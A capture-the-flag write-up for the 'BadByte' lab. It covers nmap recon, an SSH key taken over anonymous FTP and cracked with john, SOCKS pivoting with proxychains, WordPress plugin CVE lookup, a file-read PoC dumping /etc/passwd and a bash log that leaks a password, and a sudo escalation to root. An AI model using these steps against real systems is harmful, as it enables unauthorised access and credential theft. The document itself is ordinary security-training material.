Name: Badbyte
Date: 23/02/2022
Difficulty: Easy
Description: Infiltrate BadByte and help us to take over root.
Better Description: Dirty Cow and port forwarding 101
Goals: Learn and practice port forwarding
Learnt: Similar to "NFS squash root /mnt/" some loop-de-loop perspective shifts of how I understand port connections

# Recon

root@ip-10-10-35-153:~# nmap -sC -sV -O -T 4 -p- 10.10.33.152

Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-28 22:06 GMT
Stats: 0:04:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 49.42% done; ETC: 22:16 (0:04:51 remaining)
Stats: 0:14:42 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 92.10% done; ETC: 22:22 (0:01:16 remaining)
Nmap scan report for ip-10-10-33-152.eu-west-1.compute.internal (10.10.33.152)
Host is up (0.00059s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:a2:ed:93:4b:9c:bf:bb:33:4d:48:0d:fe:a4:de:96 (RSA)
|   256 22:72:00:36:eb:37:12:9f:5a:cc:c2:73:e0:4f:f1:4e (ECDSA)
|_  256 78:1d:79:dc:8d:41:f6:77:60:65:f5:74:b6:cc:8b:6d (EdDSA)
30024/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          1743 Mar 23  2021 id_rsa
|_-rw-r--r--    1 ftp      ftp            78 Mar 23  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.35.153
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
MAC Address: 02:14:57:24:04:63 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=1/28%OT=22%CT=1%CU=35067%PV=Y%DS=1%DC=D%G=Y%M=021457%T
OS:M=61F46DAE%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=2%ISR=102%TI=Z%CI=Z%TS=A
OS:)SEQ(SP=100%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M23
OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
OS:WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=
OS:F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1196.36 seconds

# Foothold

ftp $IP 30024

get id_rsa
get note.txt

cat note.txt 
I always forget my password. Just let me store an ssh key here.
- errorcauser


root@ip-10-10-35-153:~# python3 /opt/john/ssh2john.py id_rsa > err
root@ip-10-10-35-153:~# john err -w=/usr/share/wordlists/rockyou.txt

cupcake

# LEARN PORT FORWARDING WOOOH!

/etc/proxychains.conf
...
#socks4         127.0.0.1 9050
socks5          127.0.0.1 1337


ssh -i id_rsa -D 1337 errorcauser@10.10.78.12

We route the traffic from the sock5 port 1337 through the -D flag port ALSO 1337
Meaning using proxychains [cmd] we run commands THROUGH 1337 to where-ever 

Nmap scan report for localhost (127.0.0.1)
Host is up (0.00083s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

root@ip-10-10-115-203:~# proxychains nmap -sC -sV -T 4 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)

Nmap scan report for localhost (127.0.0.1)
Host is up (0.0000070s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:a2:ed:93:4b:9c:bf:bb:33:4d:48:0d:fe:a4:de:96 (RSA)
|   256 22:72:00:36:eb:37:12:9f:5a:cc:c2:73:e0:4f:f1:4e (ECDSA)
|_  256 78:1d:79:dc:8d:41:f6:77:60:65:f5:74:b6:cc:8b:6d (EdDSA)
80/tcp   open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.7
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: BadByte &#8211; You&#039;re looking at me, but they are lookin...
111/tcp  open  tcpwrapped
631/tcp  open  tcpwrapped
3389/tcp open  tcpwrapped
5432/tcp open  tcpwrapped
5901/tcp open  tcpwrapped
6001/tcp open  tcpwrapped
|_x11-access: ERROR: Script execution failed (use -d to debug)
7777/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.84 seconds

# Scan for th web exploit

https://github.com/vulnersCom/nmap-vulners
and a nice medium blog:
https://medium.com/@alexander.tyutin/continuous-vulnerability-scanning-with-nmap-ea8821d587b0

[sudo] git clone https://github.com/vulnersCom/nmap-vulners /usr/share/nmap/scripts/vulners
[sudo] nmap --script-updatedb

#YOU need the -sV argument for vulners
root@ip-10-10-115-203:~# proxychains nmap -sV --script vulners/vulners.nse 127.0.0.1

This for some reason did not work.

But with a http-wordpress-enum with hints: search-limit=1500:

proxychains nmap -p 80 --script http-wordpress-enum --script-args type="plugins",search-limit=1500 127.0.0.1

PORT   STATE SERVICE
80/tcp open  http
| http-wordpress-enum: 
| Search limited to top 1500 themes/plugins
|   plugins
|     duplicator 1.3.26
|_    wp-file-manager 6.0

Nmap done: 1 IP address (1 host up) scanned in 4.39 seconds

Duplicator:
CVE-2020-11738
wp-file-manager:
CVE-2020-25213 

# Try the poc

root@ip-10-10-103-90:~# proxychains python3 poc.py http://127.0.0.1:80 /etc/passwd
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:80-<><>-OK
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
cth:x:1000:1000:cth:/home/cth:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
errorcauser:x:1001:1001::/home/errorcauser:/bin/bash
ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin

Poc works

root@ip-10-10-103-90:~# proxychains python3 poc.py http://127.0.0.1:80 /home/cth/user.txt
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:80-<><>-OK


For the metasploit RCE most other beginner rooms don't cover the use proxies but
because of the port forwarding we need to:

set proxies socks5:127.0.0.1:1337
set rhost 127.0.0.1
set ReserveAllowProxy true

As I was using the Attackbox that had msf5 I decided that as reading the next section that password is stored in the logs
I could use:

root@ip-10-10-103-90:~# proxychains python3 poc.py http://127.0.0.1:80 /var/log/bash.log
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:80-<><>-OK
Script started on 2021-03-23 21:05:06+0000
cth@badbyte:~$ whoami
cth
cth@badbyte:~$ date
Tue 23 Mar 21:05:14 UTC 2021
cth@badbyte:~$ suod su

Command 'suod' not found, did you mean:

  command 'sudo' from deb sudo
  command 'sudo' from deb sudo-ldap

Try: sudo apt install <deb name>

# Dirty Cow till root the box

cth@badbyte:~$ G00dP@$sw0rd2020
G00dP@: command not found
cth@badbyte:~$ passwd
Changing password for cth.
(current) UNIX password: 
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
cth@badbyte:~$ ls
cth@badbyte:~$ cowsay "vim >>>>>>>>>>>>>>>>> nano"
 ____________________________
< vim >>>>>>>>>>>>>>>>> nano >
 ----------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
cth@badbyte:~$ cowsay " g = pi ^ 2 " 
 ______________
<  g = pi ^ 2  >
 --------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
cth@badbyte:~$ cowsay "mooooooooooooooooooo"
 ______________________
< mooooooooooooooooooo >
 ----------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
cth@badbyte:~$ exit

Script done on 2021-03-23 21:07:03+0000

The task says guess based on year 2019,2020 ... 2021

cth@badbyte:~$ sudo -l
[sudo] password for cth: 
Matching Defaults entries for cth on badbyte:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cth may run the following commands on badbyte:
    (ALL : ALL) ALL

sudo su root
